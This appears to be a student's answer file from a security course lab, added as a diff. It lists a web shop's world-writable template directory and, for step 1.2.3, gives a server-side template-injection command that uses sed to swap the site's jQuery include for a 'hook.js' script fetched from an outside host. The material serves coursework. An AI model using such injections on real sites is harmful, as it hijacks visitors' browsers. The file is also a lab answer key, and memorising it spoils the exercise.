@@ -1,0 +1,27 @@
+1.2.1
+/cs6264clients/2fc1c0beb992cd7096975cfebf9d5c3b
+
+1.2.2
+ls -l /cs6264clients/2fc1c0beb992cd7096975cfebf9d5c3b outputs --->
+
+total 104
+drwxrwxrwx 1 root root 4096 Nov  5  2023 .
+drwxrwxrwx 1 root root 4096 Nov  5  2023 ..
+drwxrwxrwx 1 root root 4096 Nov  5  2023 account
+-rwxrwxrwx 1 root root 1721 Nov  5  2023 base.html
+drwxrwxrwx 1 root root 4096 Nov  5  2023 bootstrap4
+-rwxrwxrwx 1 root root 7158 Nov  5  2023 checkout.html
+-rwxrwxrwx 1 root root  232 Nov  5  2023 footer.html
+-rwxrwxrwx 1 root root 4368 Nov  5  2023 home.html
+-rwxrwxrwx 1 root root 2361 Nov  5  2023 navbar.html
+drwxrwxrwx 1 root root 4096 Nov  5  2023 openid
+-rwxrwxrwx 1 root root 1613 Nov  5  2023 order_snippet.html
+-rwxrwxrwx 1 root root 2532 Nov  5  2023 order_summary.html
+-rwxrwxrwx 1 root root 5188 Nov  5  2023 payment.html
+-rwxrwxrwx 1 root root 3461 Nov  5  2023 product.html
+-rwxrwxrwx 1 root root  348 Nov  5  2023 request_refund.html
+-rwxrwxrwx 1 root root  621 Nov  5  2023 scripts.html
+drwxrwxrwx 1 root root 4096 Nov  5  2023 socialaccount
+
+Command for 1.2.3
+{{`sed 's|{% static '\''js/jquery-3.3.1.min.js'\'' %}|http://cs6264.gtisc.gatech.edu:37531/hook.js|g' /cs6264clients/2fc1c0beb992cd7096975cfebf9d5c3b/templates/scripts.html`}}
